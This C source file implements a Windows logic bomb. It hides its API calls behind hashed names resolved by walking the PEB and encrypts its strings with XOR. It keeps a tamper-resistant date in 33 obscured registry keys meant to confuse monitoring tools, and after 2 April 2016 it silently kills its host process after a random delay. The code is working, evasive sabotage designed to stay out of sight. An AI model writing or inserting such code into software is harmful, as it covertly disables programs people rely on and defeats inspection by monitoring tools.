/*
	Define's stuff
*/
#define NULL (void*)(0)
#define HKEY_CURRENT_USER 0x80000001
#define ERROR_ALREADY_EXISTS 183L
#define ERROR_SUCCESS 0L
#define ERROR_FILE_NOT_FOUND 2L
#define REG_BINARY 3
#define KEY_ALL_ACCESS 983103
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16
#define IMAGE_DIRECTORY_ENTRY_EXPORT         0   // Export Directory
//#define CLEANUP_REGISTRY

/*
	Struct's stuff
*/
typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
	unsigned short   e_magic;                     // Magic number
	unsigned short   e_cblp;                      // Bytes on last page of file
	unsigned short   e_cp;                        // Pages in file
	unsigned short   e_crlc;                      // Relocations
	unsigned short   e_cparhdr;                   // Size of header in paragraphs
	unsigned short   e_minalloc;                  // Minimum extra paragraphs needed
	unsigned short   e_maxalloc;                  // Maximum extra paragraphs needed
	unsigned short   e_ss;                        // Initial (relative) SS value
	unsigned short   e_sp;                        // Initial SP value
	unsigned short   e_csum;                      // Checksum
	unsigned short   e_ip;                        // Initial IP value
	unsigned short   e_cs;                        // Initial (relative) CS value
	unsigned short   e_lfarlc;                    // File address of relocation table
	unsigned short   e_ovno;                      // Overlay number
	unsigned short   e_res[4];                    // Reserved unsigned shorts
	unsigned short   e_oemid;                     // OEM identifier (for e_oeminfo)
	unsigned short   e_oeminfo;                   // OEM information; e_oemid specific
	unsigned short   e_res2[10];                  // Reserved unsigned shorts
	long   e_lfanew;                    // File address of new exe header
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_EXPORT_DIRECTORY {
	unsigned long   Characteristics;
	unsigned long   TimeDateStamp;
	unsigned short    MajorVersion;
	unsigned short    MinorVersion;
	unsigned long   Name;
	unsigned long   Base;
	unsigned long   NumberOfFunctions;
	unsigned long   NumberOfNames;
	unsigned long   AddressOfFunctions;     // RVA from base of image
	unsigned long   AddressOfNames;         // RVA from base of image
	unsigned long   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;


typedef struct _IMAGE_DATA_DIRECTORY {
	unsigned long   VirtualAddress;
	unsigned long   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER {
	unsigned short    Magic;
	unsigned char    MajorLinkerVersion;
	unsigned char    MinorLinkerVersion;
	unsigned long   SizeOfCode;
	unsigned long   SizeOfInitializedData;
	unsigned long   SizeOfUninitializedData;
	unsigned long   AddressOfEntryPoint;
	unsigned long   BaseOfCode;
	unsigned long   BaseOfData;
	unsigned long   ImageBase;
	unsigned long   SectionAlignment;
	unsigned long   FileAlignment;
	unsigned short    MajorOperatingSystemVersion;
	unsigned short    MinorOperatingSystemVersion;
	unsigned short    MajorImageVersion;
	unsigned short    MinorImageVersion;
	unsigned short    MajorSubsystemVersion;
	unsigned short    MinorSubsystemVersion;
	unsigned long   Win32VersionValue;
	unsigned long   SizeOfImage;
	unsigned long   SizeOfHeaders;
	unsigned long   CheckSum;
	unsigned short    Subsystem;
	unsigned short    DllCharacteristics;
	unsigned long   SizeOfStackReserve;
	unsigned long   SizeOfStackCommit;
	unsigned long   SizeOfHeapReserve;
	unsigned long   SizeOfHeapCommit;
	unsigned long   LoaderFlags;
	unsigned long   NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct _IMAGE_FILE_HEADER {
	unsigned short    Machine;
	unsigned short    NumberOfSections;
	unsigned long   TimeDateStamp;
	unsigned long   PointerToSymbolTable;
	unsigned long   NumberOfSymbols;
	unsigned short    SizeOfOptionalHeader;
	unsigned short    Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct {
	unsigned long Signature;
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS ,IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

typedef struct _UNICODE_STRING {
	unsigned short Length;
	unsigned short MaximumLength;
	unsigned short*  Buffer;
} UNICODE_STRING;

typedef struct _LIST_ENTRY {
	struct _LIST_ENTRY *Flink;
	struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _PEB_LDR_DATA {
	unsigned char Reserved1[8];
	void* Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	void* Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	void* Reserved2[2];
	void* DllBase;
	void* Reserved3[2];
	UNICODE_STRING FullDllName;
	unsigned char Reserved4[8];
	void* Reserved5[3];
	union {
		unsigned long CheckSum;
		void* Reserved6;
	} DUMMYUNIONNAME;
	unsigned long TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
	unsigned char Reserved1[2];
	unsigned char BeingDebugged;
	unsigned char Reserved2[1];
	void* Reserved3[2];
	PPEB_LDR_DATA Ldr;
} PEB;

typedef struct _MySYSTEMTIME {
	unsigned short wYear;
	unsigned short wMonth;
	unsigned short wDayOfWeek;
	unsigned short wDay;
	unsigned short wHour;
	unsigned short wMinute;
	unsigned short wSecond;
	unsigned short wMilliseconds;
} SYSTEMTIME;

typedef struct
{
	unsigned long libraryIndex;
	unsigned long functionNameHash;
	void* functionPointer;
} FunctionDescriptor;

typedef struct
{
	unsigned long libraryNameHash;
	void* libraryAddress;
} LibraryDescriptor;

/*
	Global variables
*/



// A bit of entrophy
char rnd[][4] = {
	{ 121, 108, 82, 0 },
	{ 85, 101, 108, 0 },
	{ 101, 111, 112, 0 },
	{ 116, 121, 91, 0 },
	{ 117, 114, 103, 0 },
	{ 76, 112, 114, 0 },
	{ 102, 106, 103, 0 },
	{ 120, 105, 89, 0 },
	{ 92, 120, 102, 0 },
	{ 77, 67, 69, 0 },
	{ 78, 84, 95, 0 },
	{ 118, 80, 111, 0 },
	{ 112, 121, 115, 0 },
	{ 85, 68, 92, 0 },
	{ 72, 97, 89, 0 },
	{ 72, 65, 117, 0 },
	{ 109, 77, 94, 0 },
	{ 86, 86, 85, 0 },
	{ 115, 104, 104, 0 },
	{ 96, 114, 116, 0 },
	{ 114, 86, 82, 0 },
	{ 112, 119, 91, 0 },
	{ 94, 84, 66, 0 },
	{ 97, 111, 87, 0 },
	{ 75, 66, 85, 0 },
	{ 120, 111, 71, 0 },
	{ 88, 115, 79, 0 },
	{ 76, 69, 93, 0 },
	{ 101, 92, 115, 0 },
	{ 70, 79, 121, 0 },
	{ 102, 79, 88, 0 },
	{ 75, 106, 120, 0 },
	{ 99, 68, 82, 0 }
};

LibraryDescriptor knownLibraries[] =
{
	{ 1843107157, NULL },	//Kernel32.dll
	{ 1690025353, NULL },	//Advapi32.dll
	{ 584300013,  NULL }	//Ntdll.dll
};

FunctionDescriptor knownFunctions[] =
{
	{ 0, 2198791097, NULL },	//Kernel32.dll,		_GetSystemTime,	
	{ 0, 2131293265, NULL },	//Kernel32.dll,		_CreateThread,	
	{ 1, 1187951518, NULL },	//Advapi32.dll,		_RegCreateKeyExA,
	{ 1, 1804980500, NULL },	//Advapi32.dll,		_RegQueryValueExA,
	{ 1,  878211818, NULL },	//Advapi32.dll,		_RegSetValueExA,
	{ 1, 1936406274, NULL },	//Advapi32.dll,		_RegCloseKey,	
	{ 0, 1606414587, NULL },	//Kernel32.dll,		_LoadLibraryA
	{ 0, 3476142879, NULL },	//Kernel32.dll,		_GetProcAddress
	{ 1, 4194893792, NULL },	//Advapi32.dll,		_RegDeleteKeyA
	{ 0,  236578302, NULL },	//Kernel32.dll,		_Sleep
	{ 0, 1622083437, NULL },	//Kernel32.dll,		_TerminateProcess
	{ 0, 3398268199, NULL },	//Kernel32.dll,		_GetCurrentProcess
	{ 0,  998462917, NULL }		//Kernel32.dll,		_SetSystemTime
};

typedef long(__stdcall *TypeThreadFunction)(void*);
typedef void(__stdcall *TypeGetSystemTime)		   (SYSTEMTIME*);
typedef long(__stdcall *TypeRegCreateKeyExA)	   (unsigned long, const char*, unsigned long, char*, unsigned long, unsigned long, void*, unsigned long*, unsigned long*);
typedef long(__stdcall *TypeRegQueryValueExA)	   (unsigned long, const char*, unsigned long *, unsigned long *, char*, unsigned long *);
typedef long(__stdcall *TypeRegSetValueExA)		   (unsigned long, const char*, unsigned long, unsigned long, const char *, unsigned long);
typedef long(__stdcall *TypeRegCloseKey)		   (unsigned long);
typedef unsigned long(__stdcall *TypeCreateThread) (void*  lpThreadAttributes, unsigned long, TypeThreadFunction, void*, unsigned int, unsigned long*);
typedef unsigned long(__stdcall *TypeLoadLibraryA) (const char*);
typedef void*(__stdcall *TypeGetProcAddress)	   (unsigned long, const char*);
typedef unsigned long(__stdcall *TypeRegDeleteKeyA)(unsigned long, const char*);
typedef void(__stdcall *TypeSleep)(unsigned long);
typedef int(__stdcall *TypeTerminateProcess)(unsigned long, unsigned int);
typedef unsigned long (__stdcall *TypeGetCurrentProcess)(void);
typedef void(__stdcall *TypeSetSystemTime)(SYSTEMTIME*);
typedef void(__stdcall *PIMAGE_TLS_CALLBACK) (void* DllHandle, void* Reason, void* Reserved);

//#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__xl_b")

enum KnownFunctions
{
	_GetSystemTime,			//Kernel32.dll
	_CreateThread,			//Kernel32.dll
	_RegCreateKeyExA,		//Advapi32.dll
	_RegQueryValueExA,		//Advapi32.dll
	_RegSetValueExA,		//Advapi32.dll
	_RegCloseKey,			//Advapi32.dll
	_LoadLibraryA,			//Kernel32.dll
	_GetProcAddress,		//Kernel32.dll
	_RegDeleteKeyA,			//Advapi32.dll
	_Sleep,					//Kernel32.dll
	_TerminateProcess,		//Kernel32.dll
	_GetCurrentProcess,		//Kernel32.dll
	_SetSystemTime,			//Kernel32.dll
	FunctionPlaceholdery
};

enum KnownLibraries
{
	_Kernel32,
	_AdvApi32,
	LibrariesPlaceholder
};

/*
	Macro's stuff
*/
#ifdef _DEBUG
#define MY_ASSERT(__condition) { if (!(__condition)) *((char*)(0)) = 0; }
#else
#define MY_ASSERT(__condition) __noop
#endif

#define FAIL_SILENTLY_IF_NOT(__condition)  { unsigned char failCheck = __condition; MY_ASSERT(failCheck); if (!(failCheck)) goto Fail; }

// Compare 2 date with minute resolution
#define TIME_COMPARE_LESSTHAN(time_1, time_2)	((time_1).wYear < (time_2).wYear) ||\
												((time_1).wYear == (time_2).wYear &&\
												 (time_1).wMonth < (time_2).wMonth) ||\
												((time_1).wYear == (time_2).wYear &&\
												 (time_1).wMonth == (time_2).wMonth &&\
												 (time_1).wDay < (time_2).wDay) ||\
												((time_1).wYear == (time_2).wYear &&\
												 (time_1).wMonth == (time_2).wMonth &&\
												 (time_1).wDay == (time_2).wDay &&\
												 (time_1).wHour < (time_2).wHour) ||\
												((time_1).wYear == (time_2).wYear &&\
												 (time_1).wMonth == (time_2).wMonth &&\
												 (time_1).wDay == (time_2).wDay &&\
												 (time_1).wHour == (time_2).wHour &&\
												 (time_1).wMinute < (time_2).wMinute)

#define RESET_MEMORY(memoryChunk) for (int i = 0; i < sizeof(memoryChunk); i++) reinterpret_cast<char*>(&memoryChunk)[i] = 0;

#define INVOKE(__name)  if( knownFunctions[_##__name].functionPointer == NULL )\
							   knownFunctions[_##__name].functionPointer = FunctionProvider(_##__name);\
							FAIL_SILENTLY_IF_NOT (knownFunctions[_##__name].functionPointer != NULL);\
							retValue = ((Type##__name)(knownFunctions[_##__name].functionPointer))

#define INVOKENRET(__name)  if( knownFunctions[_##__name].functionPointer == NULL )\
							   knownFunctions[_##__name].functionPointer = FunctionProvider(_##__name);\
							FAIL_SILENTLY_IF_NOT (knownFunctions[_##__name].functionPointer != NULL);\
							((Type##__name)(knownFunctions[_##__name].functionPointer))

/*
	Forward declaration stuff
*/
unsigned char Shitstorm(SYSTEMTIME* loadedTime, const SYSTEMTIME* localTime);
unsigned char Decrypt(char * argument, const int lenght);
unsigned char CheckTheFuckinTime(const SYSTEMTIME* maxDate);
unsigned long __stdcall KillEmAll(void*);
void CopyMemory(void* destination, const unsigned int size, const void* source);
void* FunctionProvider(int functionIndex);
void* ObtainBase(unsigned long hash);
void* ObtainAddress(unsigned long base, unsigned long hash);
unsigned long __forceinline StringHashW(const unsigned short*str);
unsigned long __forceinline StringHashA(const char*str);

/*
	Iterate over PEB to find the library wich hash name
	is the one in input.
*/
void* ObtainBase(unsigned long hash)
{
	static PEB* processPEB = NULL;

	if (processPEB == NULL)
	{
		__asm push eax
		__asm mov  eax, dword ptr fs:[30h]
		__asm mov processPEB, eax
		__asm pop eax
	}

	FAIL_SILENTLY_IF_NOT(processPEB != NULL);

	PEB_LDR_DATA * data = processPEB->Ldr;
	LIST_ENTRY * first = (LIST_ENTRY *)data->InMemoryOrderModuleList.Flink;
	for (LIST_ENTRY * entry = first; entry->Flink != first; entry = entry->Flink)
	{
		LDR_DATA_TABLE_ENTRY * tableEntry = (LDR_DATA_TABLE_ENTRY*)(entry);

		FAIL_SILENTLY_IF_NOT(tableEntry != NULL);

		if (tableEntry->FullDllName.Buffer != NULL)
		{
			unsigned long temp = StringHashW(tableEntry->FullDllName.Buffer);
			if (temp == hash)
				return tableEntry->Reserved2[0];
		}
	}

Fail:
	return NULL;
}

/*
	Given the address of a base and the hash of the
	exported symbol, this return the address of the function
	or NULL.
*/
void* ObtainAddress(unsigned long base, unsigned long hash)
{
	IMAGE_DOS_HEADER * dos;
	IMAGE_NT_HEADERS * nt;

	dos = (IMAGE_DOS_HEADER*)base;
	nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

	if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0)
	{
		PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		unsigned long ptr = base + exports->AddressOfNames;

		for (unsigned long i = 0; i < exports->NumberOfNames; i++)
		{
			char * temp = (char*)(base + ((unsigned long*)(ptr))[i]);
			if (StringHashA(temp) == hash)
			{
				int nameOrdinal = ((short*)(base + exports->AddressOfNameOrdinals))[i];
				return (void*)(base + ((unsigned long*)(base + exports->AddressOfFunctions))[nameOrdinal]);
			}
		}
	}
	return NULL;
}

/*
	Get the fuckin function pointer, bitches!
*/
void* FunctionProvider(int f)
{
	if (knownLibraries[knownFunctions[f].libraryIndex].libraryAddress == NULL)
	{
		knownLibraries[knownFunctions[f].libraryIndex].libraryAddress = ObtainBase(knownLibraries[knownFunctions[f].libraryIndex].libraryNameHash);
		FAIL_SILENTLY_IF_NOT(knownLibraries[knownFunctions[f].libraryIndex].libraryAddress != NULL);
	}

	if (knownFunctions[f].functionPointer == NULL)
	{
		unsigned long address = (unsigned long)knownLibraries[knownFunctions[f].libraryIndex].libraryAddress;
		knownFunctions[f].functionPointer = ObtainAddress(address, knownFunctions[f].functionNameHash);
		FAIL_SILENTLY_IF_NOT(knownFunctions[f].functionPointer != NULL);
	}
	return knownFunctions[f].functionPointer;

Fail:
	return NULL;
}

/*
	Return true if the date in input is anterior to the actual date.
	Actual date is determined crossing 2 sources:
		1. GetSystemTime
		2. The system registry
*/
unsigned char __forceinline CheckTheFuckinTime(const SYSTEMTIME* maxDate)
{
	SYSTEMTIME actualTime;
	SYSTEMTIME registryTime;
	unsigned char retValue;

	INVOKENRET(GetSystemTime)(&actualTime);

	retValue = Shitstorm(&registryTime, &actualTime);
	FAIL_SILENTLY_IF_NOT(retValue != 0);

	if (TIME_COMPARE_LESSTHAN(registryTime, actualTime))
		return TIME_COMPARE_LESSTHAN(actualTime, *maxDate);
	else
		return TIME_COMPARE_LESSTHAN(registryTime, *maxDate);

Fail:
	return 0;
}

/*
	XOR the input argument with the data contained in the rnd matrix
*/
unsigned char Decrypt(char * argument, const int lenght)
{
	FAIL_SILENTLY_IF_NOT(lenght < 32);

	for (int i = 0; i < lenght; i++)
		argument[i] ^= rnd[i][1];

	return 1;
Fail:
	return 0;
}

/*
	PRNG Implementation 
*/
unsigned int __forceinline Rand()
{
	static unsigned int holdrand = 199;
	return(((holdrand = holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

/*
	Select the maximum date stored in 33 different registry keys
	(dates are stored encrypted).
	This date, once loaded, is compared to the date obtained
	with GetSystemTime:

		1. If the latter is after the former, the former is
		   updated.
		2. Viceversa, the function return the loaded time
		   in maxFoundTime.

	This should prevent trivial tampering of the system
	time.

	Keys are 33 to confuse trivial checks with system monitoring tools.
*/
unsigned char Shitstorm(SYSTEMTIME* loadedTime, const SYSTEMTIME* localTime)
{
	unsigned char init = 0;
	int retValue;
	SYSTEMTIME temp;
	unsigned int clock = (unsigned int)__rdtsc();
	unsigned long result = 0;

	#ifdef _DEBUG
		const int keyToCheck = 6;
	#else
		const int keyToCheck = 32;
	#endif

	//char key[] = "SOFTWARE\\XXXX";
	char key[] = { 0x3f, 0x2a, 0x29, 0x2d, 0x25, 0x31, 0x38, 0x2c, 0x24, 0x1b, 0x0c, 0x08, 0x21, 0x44 };
	FAIL_SILENTLY_IF_NOT(Decrypt(key, 14) != 0);

	for (int i = 0; i < keyToCheck; i++)
	{
		key[12] = rnd[i][3];
		key[11] = rnd[i][2];
		key[10] = rnd[i][1];
		key[9] = rnd[i][0];

		INVOKE(RegCreateKeyExA)(HKEY_CURRENT_USER, key, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &result, NULL);

		FAIL_SILENTLY_IF_NOT(retValue == ERROR_SUCCESS || retValue == ERROR_ALREADY_EXISTS);
				
		unsigned long buffer_len = sizeof(SYSTEMTIME);
		//First execution -> All keys initialized with current time, max time == current time
		INVOKE(RegQueryValueExA)(result, rnd[i], NULL, NULL, (unsigned char*)&temp, &buffer_len);

		FAIL_SILENTLY_IF_NOT(retValue == ERROR_SUCCESS || retValue == ERROR_FILE_NOT_FOUND);

		if (retValue == ERROR_FILE_NOT_FOUND)
		{
			SYSTEMTIME temp2;
			CopyMemory(&temp2, sizeof(SYSTEMTIME), localTime);
			FAIL_SILENTLY_IF_NOT(Decrypt((char *)&temp2, sizeof(SYSTEMTIME)) != 0);
			INVOKE(RegSetValueExA)(result, rnd[i], 0, REG_BINARY, (const unsigned char*)&temp2, sizeof(SYSTEMTIME));
		}
		//First cycle, not first execution -> Init max_time with the value just loaded
		else if (!init)
		{
			FAIL_SILENTLY_IF_NOT(Decrypt((char*)&temp, sizeof(SYSTEMTIME)) != 0);
			CopyMemory(loadedTime, sizeof(SYSTEMTIME), &temp);
			init = 1;
		}
		//Not first cycle, not first execution -> Update max_time if I've loaded a date greather than max_time
		else
		{
			FAIL_SILENTLY_IF_NOT(Decrypt((char*)&temp, sizeof(SYSTEMTIME)) != 0);
			if (TIME_COMPARE_LESSTHAN(*loadedTime, temp))
				CopyMemory(loadedTime, sizeof(SYSTEMTIME), &temp);
		}

		if (result != 0)
		{
			INVOKE(RegCloseKey)(result);
		}
	}
	
	//First execution
	if (init == 0)
	{
		CopyMemory(loadedTime, sizeof(SYSTEMTIME), localTime);
	}
	else if (TIME_COMPARE_LESSTHAN(*loadedTime, *localTime))
	{
		unsigned char what = clock % keyToCheck;
		key[12] = rnd[what][3];
		key[11] = rnd[what][2];
		key[10] = rnd[what][1];
		key[9] = rnd[what][0];

		INVOKE(RegCreateKeyExA)(HKEY_CURRENT_USER, key, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &result, NULL);
		FAIL_SILENTLY_IF_NOT(Decrypt((char *)localTime, sizeof(SYSTEMTIME)) != 0);
		INVOKE(RegSetValueExA)(result, rnd[what], 0, REG_BINARY, (const unsigned char*)localTime, sizeof(SYSTEMTIME));
		FAIL_SILENTLY_IF_NOT(Decrypt((char *)localTime, sizeof(SYSTEMTIME)) != 0);
		INVOKE(RegCloseKey)(result);
	}

	Decrypt(key, 14);
	return 1;
Fail:
	return 0;
}
#ifdef _DEBUG
unsigned char CleanRegistry()
{
	//char key[] = "SOFTWARE\\XXXX";
	char key[] = { 0x3f, 0x2a, 0x29, 0x2d, 0x25, 0x31, 0x38, 0x2c, 0x24, 0x1b, 0x0c, 0x08, 0x21, 0x44 };
	unsigned long retValue;
	unsigned long result;
	const int keyToCheck = 32;

	FAIL_SILENTLY_IF_NOT(Decrypt(key, 14) != 0);

	for (int i = 0; i < keyToCheck; i++)
	{
		key[12] = rnd[i][3];
		key[11] = rnd[i][2];
		key[10] = rnd[i][1];
		key[9] = rnd[i][0];

		INVOKE(RegCreateKeyExA)(HKEY_CURRENT_USER, key, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &result, NULL);

		FAIL_SILENTLY_IF_NOT(retValue == ERROR_SUCCESS || retValue == ERROR_ALREADY_EXISTS);

		if (result != 0)
		{
			INVOKE(RegDeleteKeyA)(result, "");
		}
	}
	return 1;
Fail:
	return 0;
}
#endif

/*
	A stupid memcopy
*/
void __forceinline CopyMemory(void* destination, const unsigned int size, const void* source)
{
	for (unsigned int i = 0; i < size; ++i)
		((char*)(destination))[i] = ((char*)(source))[i];
}

/*
	Simple djb2 implementation
*/
unsigned long __forceinline StringHashA(const char* inputString)
{
	unsigned long computedHash = 5381;
	int currentChar;

	while (currentChar = *inputString++)
		computedHash = ((computedHash << 5) + computedHash) + currentChar;

	return computedHash;
}
/*
	Simple djb2 implementation for unicode string
*/
unsigned long __forceinline StringHashW(const unsigned short* inputString)
{
	unsigned long computedHash = 5381;
	int currentChar;

	while (currentChar = *inputString++)
		computedHash = ((computedHash << 5) + computedHash) + currentChar;

	return computedHash;
}

int mainCRTStartup(int argc, char* argv[])
{
	const SYSTEMTIME d_day = {
		2016, 4, 0, 2, 0, 0, 0, 0
	};
	
#ifdef _TEST
	SYSTEMTIME actual;

	const SYSTEMTIME test_date_1[] = {
		{ 2016, 4, 0, 1, 12, 10, 0, 0 },
		{ 2016, 4, 0, 1, 12, 13, 0, 0 },	// Test minutes
		{ 2016, 4, 0, 1, 13, 10, 0, 0 },	// Test hours
		{ 2016, 4, 0, 2, 12, 10, 0, 0 },	// Test day
		{ 2016, 5, 0, 1, 12, 10, 0, 0 },	// Test month
		{ 2017, 4, 0, 1, 12, 10, 0, 0 }		// Test year
	};

	unsigned char isActualAnterior;

	/************************************************************************/
	/*                            Macro  Test                               */
	/************************************************************************/

	/*
		Test #1.1:
			Check the comparison between 2 dates, the first is anterior to the second
	*/
	for (int i = 0; i < 6; ++i)
		for (int j = i + 1; j < 6; ++j)
			MY_ASSERT(TIME_COMPARE_LESSTHAN(test_date_1[i], test_date_1[j]) != 0);

	/*
		Test #1.2:
			Check the comparison between 2 dates, the second is anterior to the first
	*/
	for (int i = 6; i >= 0; --i)
		for (int j = i - 1; j >= 0; --j)
			MY_ASSERT(TIME_COMPARE_LESSTHAN(test_date_1[i], test_date_1[j]) == 0);

	SYSTEMTIME tempDate;

	const SYSTEMTIME test_day = {
		2016, 4, 0, 2, 12, 41, 0, 0
	};

	/************************************************************************/
	/*                        Full Check Test                               */
	/************************************************************************/

	/*
		Test #2.1:
			Perform full check with an anterior date. Day change.
	*/
	MY_ASSERT(CleanRegistry());	
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	--tempDate.wDay;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) != 0);
	/*
		Test #2.2:
			Perform full check with an anterior date. Month change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	--tempDate.wMonth;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) != 0);

	/*
		Test #2.3:
			Perform full check with an anterior date. Year change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	--tempDate.wYear;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) != 0);

	/*
		Test #2.4:
			Perform full check with a posterior date. Day change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	++tempDate.wDay;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) == 0);

	/*
		Test #2.5:
			Perform full check with a posterior date. Month change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	++tempDate.wMonth;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) == 0);

	/*
		Test #2.6:
			Perform full check with a posterior date. Year change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	++tempDate.wYear;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) == 0);

	/*
		Test #2.7:
			Perform full check with an anterior date. Hour change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	--tempDate.wHour;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) != 0);
	/*
		Test #2.8:
			Perform full check with an anterior date. Minute change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	--tempDate.wMinute;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) != 0);
	/*
		Test #2.9:
			Perform full check with a posterior date. Hour change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	++tempDate.wHour;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) == 0);
	/*
		Test #2.10:
			Perform full check with a posterior date. Minute change.
	*/
	MY_ASSERT(CleanRegistry());
	CopyMemory(&tempDate, sizeof(SYSTEMTIME), &test_day);
	++tempDate.wMinute;

	INVOKENRET(SetSystemTime)(&tempDate);
	MY_ASSERT(CheckTheFuckinTime(&test_day) == 0);
	
#else
	unsigned long int retValue;
	if (!CheckTheFuckinTime(&d_day))
	{		
		// Kill ye olde damn bastard!
		INVOKE(CreateThread)(NULL, 0, KillEmAll, NULL, 0, NULL);
	}
#endif

//	CleanRegistry();
Fail:
	return 0;
}

unsigned long __forceinline __stdcall KillEmAll(void* parameters)
{
	unsigned int clock = (unsigned int)__rdtsc();
	int retValue;

	clock %= 300000;	// Wait from 0 to 5 minutes 
	INVOKENRET(Sleep)(clock);
	INVOKE(GetCurrentProcess)();

	INVOKE(TerminateProcess)(retValue, 0);

Fail:
	return 0;
}